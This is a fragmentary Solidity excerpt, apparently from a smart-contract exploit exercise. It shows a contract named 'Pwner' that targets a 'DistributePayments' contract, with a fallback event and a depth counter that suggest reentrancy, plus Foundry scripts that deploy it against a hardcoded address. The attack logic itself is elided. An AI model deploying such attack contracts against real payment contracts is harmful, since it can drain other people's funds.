...
contract Pwner {
    DistributePayments dp;
    uint256 private depth=0;

    event CalledFallback();

    constructor(address dpAddress) public {
        dp = DistributePayments(dpAddress);
    }
...
contract ZombieDeployer is Script {
...
contract PwnDeployer is Script {
    function run() external {
        vm.startBroadcast();
        Pwner pwn = new Pwner(0x6652990B4629e9Ec0642837489fA8Bc1a5f49Fdf);
        // emit
        // Pwner pwn = Pwner(payable(0x34a35c1cB333ef6E8343412A7ad894F2f1524FC4));
